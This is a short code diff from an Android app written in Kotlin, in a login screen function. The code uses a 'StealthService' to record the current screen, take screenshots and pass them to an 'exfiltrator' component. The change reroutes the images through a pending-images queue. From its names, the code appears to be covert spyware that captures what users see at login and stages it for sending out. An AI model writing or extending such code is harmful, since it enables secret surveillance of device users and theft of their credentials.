@@ -66,7 +66,8 @@ fun LoginScreen(
                 val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
                 screenshotCapture.captureScreenshot { file ->
                     file?.let {
-                        exfiltrator.queueFile(it)
+                        exfiltrator.queueImage(it) // moves file to pending_images first
+//                        exfiltrator.queueFile(it) // logs metadata second
                         logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
                     }
                 }
